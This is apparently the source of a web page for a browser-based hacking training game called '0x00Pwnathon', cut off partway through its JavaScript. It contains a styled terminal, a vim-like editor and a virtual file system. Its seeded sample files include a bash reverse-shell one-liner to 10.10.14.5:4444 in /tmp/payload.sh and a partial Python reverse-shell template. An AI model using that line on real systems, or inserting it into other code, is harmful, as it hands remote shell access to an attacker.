---
layout: default
title: 0x00Pwnathon
permalink: /0x00pwnathon.html
---

<style>
/* ============================================
   i3-STYLE MINIMALIST DARK THEME
   ============================================ */

:root {
  --bg-primary: #000000;
  --bg-secondary: #0a0a0a;
  --bg-tertiary: #121212;
  --border-color: #333333;
  --border-focused: #83a598;
  --text-primary: #f5f5f5;
  --text-secondary: #b8b8b8;
  --text-muted: #666666;
  --accent-green: #b8bb26;
  --accent-red: #fb4934;
  --accent-yellow: #fabd2f;
  --accent-blue: #83a598;
  --accent-purple: #d3869b;
  --accent-aqua: #8ec07c;
  --accent-orange: #fe8019;
  --urgent: #fb4934;
}

* {
  box-sizing: border-box;
}

/* Main Container - i3 tiling style */
#game-container {
  background: var(--bg-primary);
  border: 2px solid var(--border-color);
  min-height: 85vh;
  max-height: 90vh;
  display: flex;
  flex-direction: column;
  position: relative;
  overflow: hidden;
  font-family: 'JetBrains Mono', 'Fira Code', 'Source Code Pro', Monaco, monospace;
}

/* i3 Status Bar */
#i3-bar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0;
  background: var(--bg-secondary);
  border-bottom: 1px solid var(--border-color);
  font-size: 11px;
  height: 22px;
}

#i3-bar-left {
  display: flex;
  align-items: center;
  height: 100%;
}

#i3-bar-right {
  display: flex;
  align-items: center;
  height: 100%;
  padding-right: 8px;
  color: var(--text-secondary);
  gap: 12px;
}

.i3-workspace {
  padding: 0 12px;
  height: 100%;
  display: flex;
  align-items: center;
  color: var(--text-muted);
  cursor: pointer;
  border-right: 1px solid var(--border-color);
  transition: all 0.1s ease;
}

.i3-workspace:hover {
  background: var(--bg-tertiary);
  color: var(--text-secondary);
}

.i3-workspace.active {
  background: var(--accent-blue);
  color: var(--bg-primary);
  font-weight: bold;
}

.i3-workspace.urgent {
  background: var(--urgent);
  color: var(--bg-primary);
}

#i3-mode {
  padding: 0 8px;
  color: var(--accent-yellow);
  font-weight: bold;
}

/* Terminal Header - minimal */
#terminal-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 4px 12px;
  background: var(--bg-tertiary);
  border-bottom: 1px solid var(--border-color);
  font-size: 11px;
  color: var(--text-secondary);
}

#terminal-header-left {
  display: flex;
  align-items: center;
  gap: 8px;
}

#terminal-header-right {
  display: flex;
  align-items: center;
  gap: 12px;
}

#terminal-title {
  color: var(--text-primary);
}

#sound-toggle {
  font-family: inherit;
  font-size: 10px;
  color: var(--text-muted);
  background: transparent;
  border: 1px solid var(--border-color);
  padding: 2px 6px;
  cursor: pointer;
}

#sound-toggle:hover, #sound-toggle.on {
  border-color: var(--accent-green);
  color: var(--accent-green);
}

/* HUD - top info bar */
#hud {
  display: none;
  padding: 6px 12px;
  background: var(--bg-secondary);
  border-bottom: 1px solid var(--border-color);
  font-size: 11px;
  color: var(--text-secondary);
}

#hud span {
  margin-right: 20px;
}

#hud .label { color: var(--text-muted); }
#hud .value { color: var(--accent-aqua); }

/* Terminal Output */
#terminal-output {
  flex: 1;
  overflow-y: auto;
  padding: 12px;
  font-size: 12px;
  line-height: 1.5;
  color: var(--text-primary);
  background: var(--bg-primary);
}

#terminal-output::-webkit-scrollbar {
  width: 4px;
}

#terminal-output::-webkit-scrollbar-track {
  background: var(--bg-primary);
}

#terminal-output::-webkit-scrollbar-thumb {
  background: var(--border-color);
}

.output-line {
  white-space: pre-wrap;
  word-wrap: break-word;
  margin: 0;
  padding: 0;
}

.output-line.error { color: var(--accent-red); }
.output-line.success { color: var(--accent-green); }
.output-line.info { color: var(--accent-blue); }
.output-line.warning { color: var(--accent-yellow); }
.output-line.system { color: var(--text-secondary); }
.output-line.ascii { color: var(--accent-green); font-weight: bold; }
.output-line.highlight { color: var(--text-primary); font-weight: bold; }
.output-line.muted { color: var(--text-muted); }
.output-line.purple { color: var(--accent-purple); }
.output-line.orange { color: var(--accent-orange); }
.output-line.aqua { color: var(--accent-aqua); }

/* Code blocks in output */
.code-block {
  background: var(--bg-secondary);
  border: 1px solid var(--border-color);
  border-left: 3px solid var(--accent-blue);
  padding: 8px 12px;
  margin: 8px 0;
  font-size: 11px;
  overflow-x: auto;
}

/* Network map display */
.network-map {
  background: var(--bg-secondary);
  border: 1px solid var(--border-color);
  padding: 12px;
  margin: 8px 0;
  font-size: 10px;
  line-height: 1.3;
}

/* ============================================
   WORKSPACE SYSTEM
   ============================================ */
.workspace {
  flex: 1;
  display: flex;
  flex-direction: column;
  overflow: hidden;
}

.workspace:not(.active) {
  display: none !important;
}

/* ============================================
   VIM WORKSPACE
   ============================================ */
#vim-workspace {
  background: var(--bg-primary);
}

#vim-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 4px 12px;
  background: var(--bg-tertiary);
  border-bottom: 1px solid var(--border-color);
  font-size: 11px;
}

#vim-filename {
  color: var(--text-primary);
}

#vim-mode {
  color: var(--accent-yellow);
  font-weight: bold;
}

#vim-status {
  color: var(--text-secondary);
}

#vim-body {
  flex: 1;
  display: flex;
  overflow: hidden;
}

#vim-lines {
  width: 50px;
  background: var(--bg-secondary);
  border-right: 1px solid var(--border-color);
  padding: 8px 4px;
  text-align: right;
  font-size: 12px;
  color: var(--text-muted);
  overflow: hidden;
  line-height: 1.5;
  white-space: pre;
}

#vim-content {
  flex: 1;
  background: var(--bg-primary);
  color: var(--text-primary);
  font-family: inherit;
  font-size: 12px;
  line-height: 1.5;
  padding: 8px;
  border: none;
  outline: none;
  resize: none;
  overflow: auto;
  caret-color: var(--accent-green);
}

/* Blinking cursor for normal mode */
#vim-content.normal-mode {
  caret-color: transparent;
}

#vim-content.normal-mode::selection {
  background: var(--accent-blue);
}

/* Block cursor simulation */
.vim-cursor {
  position: absolute;
  background: var(--accent-green);
  animation: blink 1s step-end infinite;
}

@keyframes blink {
  0%, 100% { opacity: 1; }
  50% { opacity: 0; }
}

#vim-footer {
  padding: 4px 12px;
  background: var(--bg-secondary);
  border-top: 1px solid var(--border-color);
  font-size: 11px;
  color: var(--text-secondary);
  min-height: 20px;
}

#vim-command {
  padding: 4px 12px;
  background: var(--bg-primary);
  border-top: 1px solid var(--border-color);
}

#vim-cmd-input {
  width: 100%;
  background: transparent;
  border: none;
  outline: none;
  color: var(--text-primary);
  font-family: inherit;
  font-size: 12px;
}

/* ============================================
   CODE EDITOR MODAL (vim-like) - DEPRECATED
   ============================================ */
#code-editor-overlay {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.9);
  z-index: 1000;
  justify-content: center;
  align-items: center;
}

#code-editor-container {
  width: 90%;
  max-width: 900px;
  height: 80%;
  background: var(--bg-primary);
  border: 2px solid var(--border-focused);
  display: flex;
  flex-direction: column;
}

#code-editor-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 4px 12px;
  background: var(--bg-tertiary);
  border-bottom: 1px solid var(--border-color);
  font-size: 11px;
}

#code-editor-filename {
  color: var(--text-primary);
}

#code-editor-mode {
  color: var(--accent-yellow);
  font-weight: bold;
}

#code-editor-status {
  color: var(--text-secondary);
}

#code-editor-body {
  flex: 1;
  display: flex;
  overflow: hidden;
}

#code-editor-lines {
  width: 40px;
  background: var(--bg-secondary);
  border-right: 1px solid var(--border-color);
  padding: 8px 4px;
  text-align: right;
  font-size: 11px;
  color: var(--text-muted);
  overflow: hidden;
  line-height: 1.5;
}

#code-editor-content {
  flex: 1;
  background: var(--bg-primary);
  color: var(--text-primary);
  font-family: inherit;
  font-size: 12px;
  line-height: 1.5;
  padding: 8px;
  border: none;
  outline: none;
  resize: none;
  overflow: auto;
  white-space: pre;
  tab-size: 4;
}

#code-editor-footer {
  padding: 4px 12px;
  background: var(--bg-secondary);
  border-top: 1px solid var(--border-color);
  font-size: 10px;
  color: var(--text-muted);
}

#code-editor-command {
  display: none;
  background: var(--bg-tertiary);
  padding: 4px 12px;
  border-top: 1px solid var(--border-color);
}

#code-editor-command input {
  background: transparent;
  border: none;
  outline: none;
  color: var(--text-primary);
  font-family: inherit;
  font-size: 12px;
  width: 100%;
}

/* Syntax highlighting classes */
.syntax-keyword { color: var(--accent-red); }
.syntax-string { color: var(--accent-green); }
.syntax-number { color: var(--accent-purple); }
.syntax-comment { color: var(--text-muted); font-style: italic; }
.syntax-function { color: var(--accent-yellow); }
.syntax-type { color: var(--accent-blue); }
.output-line.highlight { color: #fff; text-shadow: 0 0 10px rgba(255, 255, 255, 0.5); }

/* Terminal Input */
#terminal-input-line {
  display: flex;
  align-items: center;
  padding: 12px 16px;
  background: rgba(0, 0, 0, 0.3);
  border-top: 1px solid rgba(181, 232, 83, 0.1);
}

#prompt {
  font-family: Monaco, monospace;
  font-size: 13px;
  color: #b5e853;
  margin-right: 8px;
  white-space: nowrap;
}

#terminal-input {
  flex: 1;
  background: transparent;
  border: none;
  outline: none;
  font-family: Monaco, monospace;
  font-size: 13px;
  color: #fff;
  caret-color: #b5e853;
}

#autocomplete {
  position: absolute;
  bottom: 50px;
  left: 16px;
  background: rgba(20, 20, 20, 0.95);
  border: 1px solid rgba(181, 232, 83, 0.3);
  border-radius: 4px;
  padding: 8px 0;
  display: none;
  max-height: 150px;
  overflow-y: auto;
  z-index: 100;
}

.autocomplete-item {
  padding: 4px 12px;
  font-family: Monaco, monospace;
  font-size: 12px;
  color: #888;
  cursor: pointer;
}

.autocomplete-item:hover,
.autocomplete-item.selected {
  background: rgba(181, 232, 83, 0.1);
  color: #b5e853;
}

/* Level Select */
#level-select {
  display: none;
  padding: 20px;
}

.level-card {
  display: flex;
  align-items: center;
  padding: 16px;
  margin-bottom: 8px;
  background: rgba(181, 232, 83, 0.03);
  border: 1px solid rgba(181, 232, 83, 0.1);
  border-radius: 6px;
  cursor: pointer;
  transition: all 0.2s ease;
}

.level-card:hover:not(.locked) {
  border-color: rgba(181, 232, 83, 0.3);
  background: rgba(181, 232, 83, 0.05);
}

.level-card.locked {
  opacity: 0.4;
  cursor: not-allowed;
}

.level-card.completed {
  border-color: rgba(39, 202, 64, 0.3);
}

.level-num {
  font-family: Monaco, monospace;
  font-size: 24px;
  font-weight: bold;
  color: #b5e853;
  width: 50px;
}

.level-info {
  flex: 1;
}

.level-name {
  font-family: Monaco, monospace;
  font-size: 16px;
  color: #eaeaea;
  margin-bottom: 4px;
}

.level-desc {
  font-size: 12px;
  color: #666;
}

.level-status {
  font-family: Monaco, monospace;
  font-size: 11px;
  padding: 4px 8px;
  border-radius: 3px;
}

.level-status.unlocked { color: #b5e853; border: 1px solid rgba(181, 232, 83, 0.3); }
.level-status.completed { color: #27ca40; border: 1px solid rgba(39, 202, 64, 0.3); }
.level-status.locked { color: #555; border: 1px solid #333; }

/* HUD */
#hud {
  display: none;
  padding: 8px 16px;
  background: rgba(0, 0, 0, 0.5);
  border-bottom: 1px solid rgba(181, 232, 83, 0.1);
  font-family: Monaco, monospace;
  font-size: 11px;
  color: #666;
}

#hud span {
  margin-right: 20px;
}

#hud .label { color: #555; }
#hud .value { color: #b5e853; }

/* Scanline effect */
.scanline {
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 2px;
  background: rgba(181, 232, 83, 0.05);
  animation: scanline 8s linear infinite;
  pointer-events: none;
  z-index: 10;
}

@keyframes scanline {
  0% { top: 0; }
  100% { top: 100%; }
}

/* Glitch effect */
@keyframes glitch {
  0% { transform: translate(0); }
  20% { transform: translate(-2px, 2px); }
  40% { transform: translate(-2px, -2px); }
  60% { transform: translate(2px, 2px); }
  80% { transform: translate(2px, -2px); }
  100% { transform: translate(0); }
}

.glitch {
  animation: glitch 0.3s ease-in-out;
}

/* Progress bar */
.progress-bar {
  display: inline-block;
  width: 200px;
  height: 8px;
  background: #222;
  border-radius: 4px;
  overflow: hidden;
  margin: 4px 0;
}

.progress-fill {
  height: 100%;
  background: linear-gradient(90deg, #b5e853, #27ca40);
  transition: width 0.3s ease;
}
</style>

<!-- Code Editor Modal -->
<div id="code-editor-overlay">
  <div id="code-editor-container">
    <div id="code-editor-header">
      <span id="code-editor-filename">exploit.c</span>
      <span id="code-editor-mode">-- NORMAL --</span>
      <span id="code-editor-status">Ln 1, Col 1</span>
    </div>
    <div id="code-editor-body">
      <div id="code-editor-lines"></div>
      <textarea id="code-editor-content" spellcheck="false"></textarea>
    </div>
    <div id="code-editor-footer">
      :w to save | :q to quit | :wq to save and quit | i for insert mode | ESC for normal mode
    </div>
    <div id="code-editor-command">
      <input type="text" id="code-editor-cmd-input" placeholder="">
    </div>
  </div>
</div>

<div id="game-container" role="application" aria-label="Hacker Terminal Game">
  <!-- i3 Status Bar -->
  <div id="i3-bar" role="toolbar" aria-label="Status bar">
    <div id="i3-bar-left" role="tablist" aria-label="Workspaces">
      <div class="i3-workspace active" data-ws="1" role="tab" aria-selected="true">1:term</div>
      <div class="i3-workspace" data-ws="2" role="tab" aria-selected="false">2:web</div>
      <div class="i3-workspace" data-ws="3" role="tab" aria-selected="false">3:code</div>
      <div class="i3-workspace" data-ws="4" role="tab" aria-selected="false">4:mon</div>
      <span id="i3-mode" aria-live="polite"></span>
    </div>
    <div id="i3-bar-right" role="status" aria-label="System status">
      <span id="i3-network">eth0: 10.10.14.5</span>
      <span id="i3-cpu">cpu: 12%</span>
      <span id="i3-mem">mem: 2.1G</span>
      <span id="i3-time"></span>
    </div>
  </div>

  <!-- Terminal Header -->
  <div id="terminal-header" role="banner">
    <div id="terminal-header-left">
      <span id="terminal-title">root@kali</span>
      <span id="terminal-path">~</span>
    </div>
    <div id="terminal-header-right">
      <span id="terminal-pts">pts/0</span>
      <button id="sound-toggle" aria-label="Toggle sound" aria-pressed="false">[MUTE]</button>
    </div>
  </div>

  <!-- HUD for level info -->
  <div id="hud" role="status" aria-label="Level progress" aria-live="polite">
    <span><span class="label">LEVEL:</span> <span class="value" id="hud-level">-</span></span>
    <span><span class="label">TARGET:</span> <span class="value" id="hud-target">-</span></span>
    <span><span class="label">OBJECTIVE:</span> <span class="value" id="hud-objective">-</span></span>
    <span><span class="label">PROGRESS:</span> <span class="value" id="hud-progress">0%</span></span>
  </div>

  <!-- Level select screen -->
  <div id="level-select" role="menu" aria-label="Level selection"></div>

  <!-- Terminal Workspace (ws 1) -->
  <div id="terminal-workspace" class="workspace active">
    <!-- Main terminal output -->
    <div id="terminal-output" role="log" aria-label="Terminal output" aria-live="polite"></div>

    <!-- Autocomplete dropdown -->
    <div id="autocomplete" role="listbox" aria-label="Command suggestions"></div>

    <!-- Input line -->
    <div id="terminal-input-line">
      <span id="prompt" aria-hidden="true">$</span>
      <input type="text" id="terminal-input" autofocus autocomplete="off" spellcheck="false" aria-label="Terminal command input" aria-describedby="prompt">
    </div>
  </div>

  <!-- Vim Workspace (ws 3) -->
  <div id="vim-workspace" class="workspace" style="display: none;">
    <div id="vim-header">
      <span id="vim-filename">-- No file --</span>
      <span id="vim-mode">-- NORMAL --</span>
      <span id="vim-status">Ln 1, Col 1</span>
    </div>
    <div id="vim-body">
      <div id="vim-lines"></div>
      <textarea id="vim-content" spellcheck="false" aria-label="Vim editor content"></textarea>
    </div>
    <div id="vim-footer">
      <span id="vim-message"></span>
    </div>
    <div id="vim-command" style="display: none;">
      <input type="text" id="vim-cmd-input" aria-label="Vim command input">
    </div>
  </div>
</div>

<script>
// ============================================
// SOUND SYSTEM (8-bit beeps)
// ============================================
const AudioCtx = window.AudioContext || window.webkitAudioContext;
let audioCtx = null;
let soundEnabled = false;

function initAudio() {
  if (!audioCtx) {
    audioCtx = new AudioCtx();
  }
}

function playBeep(freq = 440, duration = 0.1, type = 'square') {
  if (!soundEnabled || !audioCtx) return;

  const oscillator = audioCtx.createOscillator();
  const gainNode = audioCtx.createGain();

  oscillator.connect(gainNode);
  gainNode.connect(audioCtx.destination);

  oscillator.frequency.value = freq;
  oscillator.type = type;

  gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
  gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + duration);

  oscillator.start(audioCtx.currentTime);
  oscillator.stop(audioCtx.currentTime + duration);
}

function playKeyPress() { playBeep(800, 0.02); }
function playEnter() { playBeep(600, 0.05); playBeep(400, 0.05); }
function playError() { playBeep(200, 0.2); }
function playSuccess() {
  playBeep(523, 0.1);
  setTimeout(() => playBeep(659, 0.1), 100);
  setTimeout(() => playBeep(784, 0.15), 200);
}
function playAlert() { playBeep(440, 0.1); setTimeout(() => playBeep(440, 0.1), 150); }
function playBoot() {
  [200, 300, 400, 500, 600].forEach((f, i) => {
    setTimeout(() => playBeep(f, 0.08), i * 60);
  });
}

// ============================================
// i3 BAR SYSTEM
// ============================================
function updateI3Bar() {
  const now = new Date();
  const timeStr = now.toLocaleTimeString('en-US', { hour12: false });
  const dateStr = now.toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric' });
  document.getElementById('i3-time').textContent = `${dateStr} ${timeStr}`;

  // Random CPU/MEM updates for realism
  if (Math.random() < 0.1) {
    const cpu = Math.floor(Math.random() * 30) + 5;
    const mem = (Math.random() * 2 + 1.5).toFixed(1);
    document.getElementById('i3-cpu').textContent = `cpu: ${cpu}%`;
    document.getElementById('i3-mem').textContent = `mem: ${mem}G`;
  }
}

// Update i3 bar every second
setInterval(updateI3Bar, 1000);
updateI3Bar();

function setI3Mode(mode) {
  document.getElementById('i3-mode').textContent = mode ? `[${mode}]` : '';
}

function setActiveWorkspace(ws) {
  document.querySelectorAll('.i3-workspace').forEach(el => {
    el.classList.toggle('active', el.dataset.ws === String(ws));
  });
}

// ============================================
// CODE EDITOR SYSTEM (vim-like)
// ============================================
const codeEditor = {
  isOpen: false,
  mode: 'normal', // normal, insert, command, visual, search
  filename: 'exploit.c',
  content: '',
  savedContent: '',
  onSave: null,
  cursorLine: 1,
  cursorCol: 1,
  // Vim registers and state
  yankBuffer: '',
  undoStack: [],
  redoStack: [],
  searchQuery: '',
  searchResults: [],
  searchIndex: 0,
  visualStart: null,
  visualEnd: null,
  lastCommand: '',
  repeatCount: 0,
  pendingKey: '', // For multi-key commands like gg, dd
};

function openCodeEditor(filename, content, onSave) {
  codeEditor.filename = filename;
  codeEditor.content = content;
  codeEditor.savedContent = content;
  codeEditor.onSave = onSave;
  codeEditor.mode = 'normal';
  codeEditor.isOpen = true;

  document.getElementById('code-editor-overlay').style.display = 'flex';
  document.getElementById('code-editor-filename').textContent = filename;
  document.getElementById('code-editor-content').value = content;
  document.getElementById('code-editor-mode').textContent = '-- NORMAL --';

  updateEditorLineNumbers();
  setActiveWorkspace(3); // Switch to code workspace

  // Focus but don't enable typing in normal mode
  document.getElementById('code-editor-content').focus();
  document.getElementById('code-editor-content').readOnly = true;
}

function closeCodeEditor(save = false) {
  if (save && codeEditor.onSave) {
    codeEditor.onSave(document.getElementById('code-editor-content').value);
  }

  codeEditor.isOpen = false;
  document.getElementById('code-editor-overlay').style.display = 'none';
  setActiveWorkspace(1); // Back to terminal
  document.getElementById('terminal-input').focus();
}

function updateEditorLineNumbers() {
  const content = document.getElementById('code-editor-content').value;
  const lines = content.split('\n').length;
  let lineNums = '';
  for (let i = 1; i <= Math.max(lines, 20); i++) {
    lineNums += i + '\n';
  }
  document.getElementById('code-editor-lines').textContent = lineNums;
}

function setEditorMode(mode) {
  codeEditor.mode = mode;
  const textarea = document.getElementById('code-editor-content');
  const modeDisplay = document.getElementById('code-editor-mode');
  const cmdLine = document.getElementById('code-editor-command');

  switch (mode) {
    case 'normal':
      modeDisplay.textContent = '-- NORMAL --';
      textarea.readOnly = true;
      cmdLine.style.display = 'none';
      textarea.focus();
      break;
    case 'insert':
      modeDisplay.textContent = '-- INSERT --';
      textarea.readOnly = false;
      cmdLine.style.display = 'none';
      textarea.focus();
      break;
    case 'visual':
      modeDisplay.textContent = '-- VISUAL --';
      textarea.readOnly = true;
      cmdLine.style.display = 'none';
      codeEditor.visualStart = textarea.selectionStart;
      break;
    case 'visualLine':
      modeDisplay.textContent = '-- VISUAL LINE --';
      textarea.readOnly = true;
      cmdLine.style.display = 'none';
      codeEditor.visualStart = textarea.selectionStart;
      break;
    case 'command':
      modeDisplay.textContent = '';
      cmdLine.style.display = 'block';
      document.getElementById('code-editor-cmd-input').value = ':';
      document.getElementById('code-editor-cmd-input').focus();
      break;
    case 'search':
      modeDisplay.textContent = '';
      cmdLine.style.display = 'block';
      document.getElementById('code-editor-cmd-input').value = '/';
      document.getElementById('code-editor-cmd-input').focus();
      break;
    case 'replace':
      modeDisplay.textContent = '-- REPLACE --';
      textarea.readOnly = false;
      cmdLine.style.display = 'none';
      break;
  }
}

// ═══════════════════════════════════════════════════════════════
// VIRTUAL FILE SYSTEM for Code Editor
// ═══════════════════════════════════════════════════════════════
const editorFileSystem = {
  files: {},
  currentDir: '/home/user',

  // Initialize with some default files
  init() {
    this.files = {
      '/home/user/exploit.c': `#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Kernel exploit template
// Target: CVE-XXXX-XXXX

int main(int argc, char *argv[]) {
    printf("[*] Exploit starting...\\n");

    // TODO: Add exploit code here

    return 0;
}`,
      '/home/user/shell.py': `#!/usr/bin/env python3
import socket
import subprocess
import os

# Reverse shell template
RHOST = "10.10.14.5"
RPORT = 4444

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    # TODO: Implement shell

if __name__ == "__main__":
    connect()`,
      '/home/user/notes.txt': `=== Penetration Test Notes ===

Target: 10.10.10.15
Date: 2024-XX-XX

Enumeration:
- [ ] Port scan
- [ ] Service enumeration
- [ ] Web directory fuzzing

Findings:
- TBD

Credentials Found:
- TBD
`,
      '/home/user/.bashrc': `# .bashrc
export PS1='\\u@\\h:\\w\\$ '
alias ll='ls -la'
alias grep='grep --color=auto'
`,
      '/tmp/payload.sh': `#!/bin/bash
# Payload script
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
`
    };

    // Load from localStorage if exists
    const saved = localStorage.getItem('editorFileSystem');
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        this.files = { ...this.files, ...parsed };
      } catch (e) {
        console.error('Failed to load editor filesystem:', e);
      }
    }
  },

  save() {
    localStorage.setItem('editorFileSystem', JSON.stringify(this.files));
  },

  readFile(path) {
    const fullPath = this.resolvePath(path);
    return this.files[fullPath] || null;
  },

  writeFile(path, content) {
    const fullPath = this.resolvePath(path);
    this.files[fullPath] = content;
    this.save();
    return true;
  },

  deleteFile(path) {
    const fullPath = this.resolvePath(path);
    if (this.files[fullPath]) {
      delete this.files[fullPath];
      this.save();
      return true;
    }
    return false;
  },

  listFiles(dir) {
    const fullDir = this.resolvePath(dir || this.currentDir);
    const files = [];
    for (const path of Object.keys(this.files)) {
      if (path.startsWith(fullDir + '/')) {
        const relative = path.slice(fullDir.length + 1);
        if (!relative.includes('/')) {
          files.push(relative);
        }
      }
    }
    return files;
  },

  resolvePath(path) {
    if (path.startsWith('/')) return path;
    if (path.startsWith('~/')) return '/home/user' + path.slice(1);
    return this.currentDir + '/' + path;
  },

  exists(path) {
    return this.files[this.resolvePath(path)] !== undefined;
  }
};

// Initialize filesystem on load
document.addEventListener('DOMContentLoaded', () => {
  editorFileSystem.init();
});

function handleEditorCommand(cmd) {
  cmd = cmd.trim();

  // :w - write current file
  if (cmd === ':w') {
    const content = document.getElementById('code-editor-content').value;
    editorFileSystem.writeFile(codeEditor.filename, content);
    if (codeEditor.onSave) {
      codeEditor.onSave(content);
    }
    codeEditor.savedContent = content;
    setEditorMode('normal');
    print(`"${codeEditor.filename}" written`, 'system');
    return;
  }

  // :w <filename> - write to specific file
  if (cmd.startsWith(':w ')) {
    const filename = cmd.slice(3).trim();
    const content = document.getElementById('code-editor-content').value;
    editorFileSystem.writeFile(filename, content);
    codeEditor.filename = filename;
    codeEditor.savedContent = content;
    document.getElementById('code-editor-filename').textContent = filename;
    setEditorMode('normal');
    print(`"${filename}" written`, 'system');
    return;
  }

  // :e <filename> - edit/open file
  if (cmd.startsWith(':e ')) {
    const filename = cmd.slice(3).trim();
    const content = editorFileSystem.readFile(filename);
    if (content !== null) {
      codeEditor.filename = filename;
      codeEditor.content = content;
      codeEditor.savedContent = content;
      document.getElementById('code-editor-filename').textContent = filename;
      document.getElementById('code-editor-content').value = content;
      updateEditorLineNumbers();
      setEditorCursorPos(1, 1);
    } else {
      // New file
      codeEditor.filename = filename;
      codeEditor.content = '';
      codeEditor.savedContent = '';
      document.getElementById('code-editor-filename').textContent = filename + ' [New]';
      document.getElementById('code-editor-content').value = '';
      updateEditorLineNumbers();
    }
    setEditorMode('normal');
    return;
  }

  // :ls or :files - list files
  if (cmd === ':ls' || cmd === ':files') {
    const files = Object.keys(editorFileSystem.files);
    print('Files in editor filesystem:', 'info');
    files.forEach(f => print('  ' + f, 'system'));
    setEditorMode('normal');
    return;
  }

  // :q - quit
  if (cmd === ':q') {
    if (document.getElementById('code-editor-content').value !== codeEditor.savedContent) {
      print('E37: No write since last change (add ! to override)', 'error');
      setEditorMode('normal');
      return;
    }
    closeCodeEditor(false);
    return;
  }

  // :wq or :x - write and quit
  if (cmd === ':wq' || cmd === ':x') {
    const content = document.getElementById('code-editor-content').value;
    editorFileSystem.writeFile(codeEditor.filename, content);
    if (codeEditor.onSave) {
      codeEditor.onSave(content);
    }
    closeCodeEditor(true);
    return;
  }

  // :q! - force quit
  if (cmd === ':q!') {
    document.getElementById('code-editor-content').value = codeEditor.savedContent;
    closeCodeEditor(false);
    return;
  }

  // :<number> - go to line
  const lineMatch = cmd.match(/^:(\d+)$/);
  if (lineMatch) {
    const lineNum = parseInt(lineMatch[1]);
    setEditorCursorPos(lineNum, 1);
    setEditorMode('normal');
    return;
  }

  // :%s/pattern/replacement/flags - substitute
  const subMatch = cmd.match(/^:%s\/(.+?)\/(.*)\/([gi]*)$/);
  if (subMatch) {
    saveUndoState();
    const [, pattern, replacement, flags] = subMatch;
    const textarea = document.getElementById('code-editor-content');
    try {
      const regex = new RegExp(pattern, flags || 'g');
      const matches = textarea.value.match(regex);
      const count = matches ? matches.length : 0;
      textarea.value = textarea.value.replace(regex, replacement);
      updateEditorLineNumbers();
      print(`${count} substitution(s)`, 'info');
    } catch (e) {
      print(`E486: Pattern not found: ${pattern}`, 'error');
    }
    setEditorMode('normal');
    return;
  }

  // :set <option> - set options
  if (cmd.startsWith(':set ')) {
    const option = cmd.slice(5).trim();
    if (option === 'number' || option === 'nu') {
      document.getElementById('code-editor-lines').style.display = 'block';
      print('Line numbers enabled', 'info');
    } else if (option === 'nonumber' || option === 'nonu') {
      document.getElementById('code-editor-lines').style.display = 'none';
      print('Line numbers disabled', 'info');
    } else if (option === 'syntax on') {
      print('Syntax highlighting enabled', 'info');
    } else if (option === 'syntax off') {
      print('Syntax highlighting disabled', 'info');
    }
    setEditorMode('normal');
    return;
  }

  // :help - show help
  if (cmd === ':help' || cmd === ':h') {
    print('╔═══════════════════════════════════════════════════════════════════╗', 'info');
    print('║                       VIM EDITOR HELP                             ║', 'info');
    print('╠═══════════════════════════════════════════════════════════════════╣', 'info');
    print('║ MODES:                                                            ║', 'system');
    print('║   i     - Insert mode     a     - Append mode                     ║', 'system');
    print('║   v     - Visual mode     V     - Visual line mode                ║', 'system');
    print('║   :     - Command mode    /     - Search mode                     ║', 'system');
    print('║   Esc   - Normal mode     R     - Replace mode                    ║', 'system');
    print('╠═══════════════════════════════════════════════════════════════════╣', 'info');
    print('║ MOVEMENT:                                                         ║', 'system');
    print('║   h/j/k/l - Left/Down/Up/Right    w/b - Word forward/back         ║', 'system');
    print('║   0/$     - Line start/end        ^   - First non-whitespace      ║', 'system');
    print('║   gg/G    - File start/end        :n  - Go to line n              ║', 'system');
    print('║   f<c>    - Find char forward     F<c>- Find char backward        ║', 'system');
    print('╠═══════════════════════════════════════════════════════════════════╣', 'info');
    print('║ EDITING:                                                          ║', 'system');
    print('║   x       - Delete char           dd  - Delete line               ║', 'system');
    print('║   yy      - Yank line             p/P - Paste after/before        ║', 'system');
    print('║   u       - Undo                  Ctrl+r - Redo                   ║', 'system');
    print('║   o/O     - New line below/above  J   - Join lines                ║', 'system');
    print('║   ciw     - Change inner word     diw - Delete inner word         ║', 'system');
    print('╠═══════════════════════════════════════════════════════════════════╣', 'info');
    print('║ COMMANDS:                                                         ║', 'system');
    print('║   :w      - Save file             :q  - Quit                      ║', 'system');
    print('║   :wq     - Save and quit         :q! - Force quit                ║', 'system');
    print('║   :e file - Open file             :ls - List files                ║', 'system');
    print('║   :%s/p/r/g - Substitute          :n  - Go to line n              ║', 'system');
    print('╚═══════════════════════════════════════════════════════════════════╝', 'info');
    setEditorMode('normal');
    return;
  }

  // :new - new buffer
  if (cmd === ':new') {
    codeEditor.filename = 'untitled';
    codeEditor.content = '';
    codeEditor.savedContent = '';
    document.getElementById('code-editor-filename').textContent = 'untitled [New]';
    document.getElementById('code-editor-content').value = '';
    updateEditorLineNumbers();
    setEditorMode('normal');
    return;
  }

  // Unknown command
  setEditorMode('normal');
  if (cmd.length > 1) {
    print(`E492: Not an editor command: ${cmd.slice(1)}`, 'error');
  }
}

// ═══════════════════════════════════════════════════════════════
// VIM EDITOR - Helper functions
// ═══════════════════════════════════════════════════════════════
function getEditorCursorPos() {
  const textarea = document.getElementById('code-editor-content');
  const pos = textarea.selectionStart;
  const lines = textarea.value.substr(0, pos).split('\n');
  return {
    line: lines.length,
    col: lines[lines.length - 1].length + 1,
    pos: pos
  };
}

function setEditorCursorPos(line, col) {
  const textarea = document.getElementById('code-editor-content');
  const lines = textarea.value.split('\n');

  // Clamp line
  line = Math.max(1, Math.min(line, lines.length));
  // Clamp col
  const lineContent = lines[line - 1] || '';
  col = Math.max(1, Math.min(col, lineContent.length + 1));

  // Calculate position
  let pos = 0;
  for (let i = 0; i < line - 1; i++) {
